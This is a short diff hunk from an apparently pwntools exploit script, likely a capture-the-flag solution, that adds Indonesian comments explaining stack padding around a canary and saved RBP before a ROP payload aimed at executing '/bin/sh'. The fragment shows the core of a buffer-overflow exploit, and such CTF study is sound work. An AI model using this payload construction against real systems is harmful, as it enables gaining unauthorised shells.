@@ -22,8 +22,9 @@ rax = b + 0x1219
 syscall = b + 0x121d
 string = next(elf.search(b'/bin/sh\00'))
 
-pad = b'a'*(0x50-8)
-pad2 = b'a'*8
+pad = b'a'*(0x50-8) # sengaja dikurangin karena ada canary yang ukurannya 8 byte. canary ada di bawah saved rbp.
+pad2 = b'a'*8 # nimpa saved rbp
+
 pay = flat(
     pad,
     canary,
